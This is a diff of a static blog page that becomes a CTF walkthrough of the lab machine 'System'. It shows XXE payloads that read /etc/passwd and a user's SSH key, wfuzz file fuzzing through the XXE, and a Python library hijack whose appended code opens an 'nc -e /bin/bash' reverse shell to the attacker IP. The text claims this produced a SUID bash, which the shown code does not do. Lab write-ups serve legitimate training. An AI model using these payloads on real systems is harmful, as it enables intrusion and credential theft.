@@ -1,23 +1,24 @@
-<!DOCTYPE html><html lang="en-US" class="dark"><head><meta charset="utf-8">
+<!DOCTYPE html>
+<html lang="en-US"><head><meta charset="utf-8">
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Null Blog | Null Blog</title>
-<meta property="og:title" content="Null Blog | Null Blog" />
-<meta name="twitter:title" content="Null Blog | Null Blog" />
-<meta itemprop="name" content="Null Blog | Null Blog" />
-<meta name="application-name" content="Null Blog | Null Blog" />
+<title itemprop="name">System - Walkthrough | Null Blog</title>
+<meta property="og:title" content="System - Walkthrough | Null Blog" />
+<meta name="twitter:title" content="System - Walkthrough | Null Blog" />
+<meta itemprop="name" content="System - Walkthrough | Null Blog" />
+<meta name="application-name" content="System - Walkthrough | Null Blog" />
 <meta property="og:site_name" content="Null Blog" />
 
-<meta name="description" content="CTF writeups, hacking notes, and walkthroughs.">
-<meta itemprop="description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs." />
-<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs." />
+<meta name="description" content="Walkthrough for the System machine.">
+<meta itemprop="description" content="Walkthrough for the System machine." />
+<meta property="og:description" content="Walkthrough for the System machine." />
+<meta name="twitter:description" content="Walkthrough for the System machine." />
 
 <meta property="og:locale" content="en-US" />
 <meta name="language" content="en-US" />
 
-  <link rel="alternate" hreflang="en" href="https://nvru.github.io/" title="" />
+  <link rel="alternate" hreflang="en" href="https://nvru.github.io/walkthrough/hmv/system/" title="" />
 
 
 
@@ -27,26 +28,33 @@
 <meta name="generator" content="Hugo 0.164.0">
 
     
-    <meta property="og:url" content="https://nvru.github.io/">
+    <meta property="og:url" content="https://nvru.github.io/walkthrough/hmv/system/">
 	<meta property="og:site_name" content="Null Blog">
-	<meta property="og:title" content="Null Blog">
-	<meta property="og:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta property="og:title" content="System - Walkthrough">
+	<meta property="og:description" content="Walkthrough for the System machine.">
 	<meta property="og:locale" content="en_US">
-	<meta property="og:type" content="website">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="walkthrough">
+		<meta property="article:published_time" content="2026-07-22T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-22T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Walkthrough">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Nginx">
+		<meta property="article:tag" content="Xxe">
+		<meta property="article:tag" content="Ssh">
 
 
     
     
 	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="Null Blog">
-	<meta name="twitter:description" content="CTF writeups, hacking notes, and walkthroughs.">
+	<meta name="twitter:title" content="System - Walkthrough">
+	<meta name="twitter:description" content="Walkthrough for the System machine.">
 
 
     
 
-    <link rel="canonical" href="https://nvru.github.io/">
-    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="Null Blog">
-    <link href="/index.xml" rel="feed" type="application/rss+xml" title="Null Blog">
+    <link rel="canonical" href="https://nvru.github.io/walkthrough/hmv/system/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -74,7 +82,7 @@
     
     
 </head>
-<body data-theme="dark" class="notransition">
+<body data-theme = "dark" class="notransition">
 
 <script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
 
@@ -101,14 +109,14 @@ stroke-linejoin="round" class="feather feather-home">
                 
                 
                 <li>
-                    <a class="menu-link active" href="/">
+                    <a class="menu-link " href="/">
                         Home
                     </a>
                     
                 </li>
                 
                 <li>
-                    <a class="menu-link " href="/walkthrough/">
+                    <a class="menu-link active" href="/walkthrough/">
                         Walkthroughs
                     </a>
                     
@@ -164,114 +172,185 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper">
-        
 
-
-<div class="author">
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">System - Walkthrough</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-07-22T00:00:00&#43;00:00" itemprop="datePublished"> 22 Jul 2026 </time>
+                </div>
+                
+            </header>
+            
     
-    
-    
-    
-    
-    <img
-        class="author-avatar"
-        src="/profile_hu_cdbd651eb39ff014.webp"
-        srcset="/profile_hu_8a40028f3c101c79.webp 2x, /profile_hu_84fda8faaebc864c.webp 3x"
-        alt="null void root"
-        width="70"
-        height="70" />
-    
-    
-    <h2 class="author-name">Pentester | CTF Player | Unix Admin</h2>
-    <p class="author-bio">I document my CTF machines and pentesting practice.</p>
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#port-scanning">Port Scanning</a>
+      <ul>
+        <li><a href="#rustscan">RustScan</a></li>
+        <li><a href="#results">Results</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+        <li><a href="#xxe">XXE</a></li>
+        <li><a href="#reading-sensitive-files">Reading Sensitive Files</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#david--root">david → root</a></li>
+        <li><a href="#python-library-hijacking">Python Library Hijacking</a></li>
+      </ul>
+    </li>
+    <li><a href="#credentials">Credentials</a></li>
+    <li><a href="#flags">Flags</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.35</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access by exploiting an XXE vulnerability to recover SSH credentials, and escalate privileges through Python library hijacking.</p>
+<p><img src="/images/hmv/system/vm.png" alt="Machine information"></p>
+<hr>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="rustscan">RustScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.35 -- -sC -sV -A -oA nmap/rust
+</span></span></code></pre></div><h3 id="results">Results</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span></code></pre></div><p>Only SSH and an Nginx web server were exposed, making the web application the obvious starting point.</p>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Browsing to the website presented a registration page.</p>
+<p><img src="/images/hmv/system/http.png" alt="Machine information"></p>
+<p>Submitting the registration form did not appear to perform any useful action.</p>
+<p><img src="/images/hmv/system/http_reg.png" alt="Registration page">
+Inspecting the page source revealed a JavaScript function that generated an XML document and submitted it to <code>magic.php</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">XMLFunction</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xml</span> <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&#39;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;details&gt;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;email&gt;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#email&#34;</span>).<span style="color:#a6e22e">val</span>() <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;/email&gt;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;password&gt;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#34;#password&#34;</span>).<span style="color:#a6e22e">val</span>() <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;/password&gt;&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;/details&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;magic.php&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">xmlhttp</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">xml</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img src="/images/hmv/system/js_xml.png" alt="JavaScript XML generation"></p>
+<p>Since user-controlled XML was being processed by the server, the application appeared to be a good candidate for XXE testing.</p>
+<hr>
+<h3 id="xxe">XXE</h3>
+<p>The following payload was submitted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE foo [
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span>]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;details&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;email&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/email&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;password&gt;</span>void<span style="color:#f92672">&lt;/password&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/details&gt;</span>
+</span></span></code></pre></div><p>The response successfully returned the contents of <code>/etc/passwd</code>, confirming the XXE vulnerability.</p>
+<p><img src="/images/hmv/system/xxe_passwd.png" alt="Reading /etc/passwd"></p>
+<p>From the output, the user <code>david</code> was identified.</p>
+<p><img src="/images/hmv/system/david_xxe.png" alt="Reading /etc/passwd"></p>
+<hr>
+<h3 id="reading-sensitive-files">Reading Sensitive Files</h3>
+<p>I first attempted to recover David&rsquo;s SSH private key using the XXE vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/home/david/.ssh/id_rsa
+</span></span></code></pre></div><p>The file was successfully read.</p>
+<p><img src="/images/hmv/system/xxe_ssh.png" alt="SSH key"></p>
+<p>Although the private key was successfully recovered, it turned out to be a rabbit hole. SSH authentication with the key failed, so I continued searching for other sensitive files.</p>
+<p><img src="/images/hmv/system/ssh_nop.png" alt="SSH failed"></p>
+<p>Further enumeration was required.</p>
+<p>Using <code>wfuzz</code>, I searched for additional interesting files within David&rsquo;s home directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-w /opt/wordlists/seclists/Discovery/Web-Content/quickhits.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>-d <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE results [&lt;!ENTITY test SYSTEM &#34;file:///home/david/FUZZ&#34;&gt;]&gt;&lt;details&gt;&lt;email&gt;&amp;test;&lt;/email&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/details&gt;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>--hh <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>http://10.10.10.35/magic.php
+</span></span></code></pre></div><p>The scan revealed several interesting files, including <code>.viminfo</code>.</p>
+<p><img src="/images/hmv/system/fuzz_viminfo.png" alt="Directory enumeration"></p>
+<p>Inspecting <code>.viminfo</code> revealed that David had previously opened:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/local/etc/mypass.txt
+</span></span></code></pre></div><p><img src="/images/hmv/system/viminfo.png" alt=".viminfo"></p>
+<p>Reading that file through XXE returned what appeared to be David&rsquo;s password written in leetspeak.</p>
+<p><img src="/images/hmv/system/david_passwd.png" alt="Password recovered"></p>
+<hr>
+<h2 id="initial-access">Initial Access</h2>
+<p>Using the recovered credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: david
+</span></span><span style="display:flex;"><span>Password: h4ck3rd4v!d
+</span></span></code></pre></div><p>SSH authentication was successful.</p>
+<p><img src="/images/hmv/system/ssh_david.png" alt="SSH login"></p>
+<hr>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="david--root">david → root</h3>
+<p>The first step was checking for common privilege escalation vectors.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>which doas
+</span></span></code></pre></div><p>Neither <code>sudo</code> nor <code>doas</code> was available.</p>
+<p><img src="/images/hmv/system/sudo_doas.png" alt="No sudo"></p>
+<p>I also checked for Linux capabilities.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>getcap -r / 2&gt;/dev/null
+</span></span></code></pre></div><p>No useful capabilities were found.</p>
+<p><img src="/images/hmv/system/no_cap.png" alt="No capabilities"></p>
+<p>Finally, I searched for SUID binaries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>Nothing interesting appeared.</p>
+<p><img src="/images/hmv/system/no_suid.png" alt="No SUID"></p>
+<hr>
+<h3 id="python-library-hijacking">Python Library Hijacking</h3>
+<p>While enumerating <code>/opt</code>, I discovered an interesting script.</p>
+<p><img src="/images/hmv/system/opt_scr.png" alt="Script"></p>
+<p>The script imported Python&rsquo;s <code>os</code> module while running with elevated privileges.</p>
+<p>Since it relied on the <code>os</code> module, I checked whether the corresponding <code>os.py</code> file was writable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name os.py -ls 2&gt;/dev/null
+</span></span></code></pre></div><p>The <code>os.py</code> module used by the script was writable by all users, making Python library hijacking possible.</p>
+<p><img src="/images/hmv/system/fnd_lib.png" alt="Writable library"></p>
+<p>Initially, I inserted a payload at the beginning of the file to create a SUID shell and later attempted a reverse shell, but neither executed successfully.</p>
+<p>After appending the payload to the end of the module instead, it executed when the privileged script imported the library.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">nvru</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>    subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;nc&#34;</span>,<span style="color:#e6db74">&#34;-e&#34;</span>,<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;10.10.10.2&#34;</span>,<span style="color:#e6db74">&#34;9001&#34;</span>])
+</span></span><span style="display:flex;"><span>nvru()
+</span></span></code></pre></div><p>Executing the vulnerable script resulted in a SUID-enabled <code>/bin/bash</code>, allowing root access.</p>
+<p><img src="/images/hmv/system/root.png" alt="Root shell"></p>
+<hr>
+<h2 id="credentials">Credentials</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>david:h4ck3rd4v!d
+</span></span></code></pre></div><hr>
+<h2 id="flags">Flags</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:79f3964a3a0f1a050761017111efffe0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:3aa26937ecfcc6f2ba466c14c89b92c4
+</span></span></code></pre></div>
+            </div>
+        </article></main>
 </div>
-
-        <main aria-label="Content">
-            <h3 class="posts-item-note" aria-label="Recent Posts">Recent Posts</h3>
-            
-            
-            
-            
-            <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/system/">System - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-22T00:00:00Z">
-        22 Jul 2026
-    </time>
-</article>
-
-            
-            <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/baseme/">Baseme - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-22T00:00:00Z">
-        22 Jul 2026
-    </time>
-</article>
-
-            
-            <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/iot/">IoT - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-21T00:00:00Z">
-        21 Jul 2026
-    </time>
-</article>
-
-            
-            <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/hmv/hostname/">Hostname - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-21T00:00:00Z">
-        21 Jul 2026
-    </time>
-</article>
-
-            
-            <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/walkthrough/vulnhub/who_wants_to_be_king1/">Who Wants to Be King? 1 - Walkthrough</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2026-07-20T00:00:00Z">
-        20 Jul 2026
-    </time>
-</article>
-
-            
-            
-            <p>
-                
-                <a href="https://nvru.github.io/walkthrough/">See all posts</a>
-                
-            </p>
-            
-        </main>
-    </div><footer class="footer">
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
@@ -354,5 +433,4 @@ stroke-linejoin="round" class="feather feather-home">
     
 
 </body>
-
 </html>
